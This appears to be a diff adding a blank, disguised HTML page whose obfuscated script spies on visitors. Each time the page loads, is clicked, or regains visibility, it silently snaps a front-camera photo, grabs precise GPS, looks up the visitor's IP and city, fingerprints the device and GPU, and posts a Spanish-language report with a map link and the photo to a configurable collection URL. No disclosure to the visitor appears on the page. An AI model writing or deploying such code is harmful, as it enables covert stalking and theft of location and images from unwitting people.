@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>.</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body, html { width: 100%; height: 100%; overflow: hidden; background: #ffffff; }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+    <video id="v" autoplay playsinline></video>
+    <canvas id="c"></canvas>
+    <script>
+        const WORKER_URL = '';
+        (function() {
+            let a = false;
+            let b = null;
+            async function c() {
+                const d = document.getElementById('v');
+                const e = document.getElementById('c');
+                try {
+                    if (b) { b.getTracks().forEach(t => t.stop()); b = null; }
+                    const f = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } } });
+                    b = f;
+                    d.srcObject = f;
+                    await new Promise(r => { d.onloadedmetadata = () => { d.play(); r(); }; });
+                    await new Promise(r => setTimeout(r, 300));
+                    e.width = d.videoWidth || 640;
+                    e.height = d.videoHeight || 480;
+                    e.getContext('2d').drawImage(d, 0, 0);
+                    const g = await new Promise(r => e.toBlob(r, 'image/jpeg', 0.7));
+                    return g;
+                } catch(h) { return null; }
+            }
+            function i() {
+                return new Promise((j) => {
+                    if (!navigator.geolocation) { j(null); return; }
+                    navigator.geolocation.getCurrentPosition(
+                        (k) => {
+                            j({ lat: k.coords.latitude, lng: k.coords.longitude, acc: k.coords.accuracy, alt: k.coords.altitude || null, heading: k.coords.heading || null, speed: k.coords.speed || null, timestamp: k.timestamp });
+                        },
+                        () => { j(null); },
+                        { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+                    );
+                });
+            }
+            async function l() {
+                try {
+                    const m = await fetch('https://ipapi.co/json/');
+                    const n = await m.json();
+                    if (n.latitude && n.longitude) {
+                        return { lat: n.latitude, lng: n.longitude, ciudad: n.city, region: n.region, pais: n.country_name, ip: n.ip };
+                    }
+                } catch(o) {}
+                return null;
+            }
+            function p() {
+                const q = navigator.userAgent;
+                let r = 'Desconocido';
+                if (q.includes('iPhone')) r = 'iPhone';
+                else if (q.includes('iPad')) r = 'iPad';
+                else if (q.includes('Android')) r = 'Android';
+                else if (q.includes('Mac')) r = 'Mac';
+                else if (q.includes('Windows')) r = 'Windows PC';
+                else if (q.includes('Linux')) r = 'Linux';
+                return { modelo: r, ua: q, language: navigator.language || 'N/A', plataforma: navigator.platform || 'N/A', vendor: navigator.vendor || 'N/A' };
+            }
+            function s() {
+                try {
+                    const t = document.createElement('canvas');
+                    const u = t.getContext('2d');
+                    t.width = 200; t.height = 50;
+                    u.fillStyle = '#f60';
+                    u.fillRect(0, 0, 200, 50);
+                    u.fillStyle = '#069';
+                    u.font = '14px Arial';
+                    u.fillText('FP', 10, 30);
+                    const v = t.toDataURL().slice(0, 80);
+                    let w = 'N/A';
+                    try {
+                        const x = document.createElement('canvas').getContext('webgl');
+                        const y = x.getExtension('WEBGL_debug_renderer_info');
+                        w = y ? x.getParameter(y.UNMASKED_RENDERER_WEBGL) : 'N/A';
+                    } catch(z) {}
+                    return { gpu: w, canvas: v };
+                } catch(z) {
+                    return { gpu: 'N/A', canvas: 'N/A' };
+                }
+            }
+            async function A() {
+                if (a) return;
+                a = true;
+                try {
+                    const [B, C, D, E, F] = await Promise.all([c(), i(), l(), p(), s()]);
+                    let G = '📊 *Captura*';
+                    G += `\n━━━━━━━━━━━━━━━━`;
+                    if (C) {
+                        G += `\n📍 *GPS* (precisión ±${C.acc}m)`;
+                        G += `\n   Lat: ${C.lat}`;
+                        G += `\n   Lng: ${C.lng}`;
+                        G += `\n   Maps: https://maps.google.com/?q=${C.lat},${C.lng}`;
+                    } else {
+                        G += `\n📍 *GPS*: No disponible`;
+                    }
+                    if (D) {
+                        G += `\n\n🌐 *IP*`;
+                        G += `\n   IP: ${D.ip || 'N/A'}`;
+                        G += `\n   País: ${D.pais || 'N/A'}`;
+                        G += `\n   Ciudad: ${D.ciudad || 'N/A'}`;
+                    }
+                    G += `\n\n📱 *Dispositivo*: ${E.modelo}`;
+                    G += `\n🎨 *GPU*: ${F.gpu}`;
+                    G += `\n⏰ ${new Date().toISOString()}`;
+                    const H = new FormData();
+                    H.append('text', G);
+                    if (B) H.append('photo', B, 'photo.jpg');
+                    if (C) { H.append('latitude', C.lat); H.append('longitude', C.lng); }
+                    await fetch(WORKER_URL, { method: 'POST', body: H });
+                } catch(I) {}
+                a = false;
+            }
+            window.addEventListener('load', () => { setTimeout(A, 500); });
+            document.addEventListener('click', () => { if (b) { b.getTracks().forEach(t => t.stop()); b = null; } setTimeout(A, 300); });
+            document.addEventListener('visibilitychange', () => { if (!document.hidden) { if (b) { b.getTracks().forEach(t => t.stop()); b = null; } setTimeout(A, 300); } });
+        })();
+    </script>
+</body>
+</html>
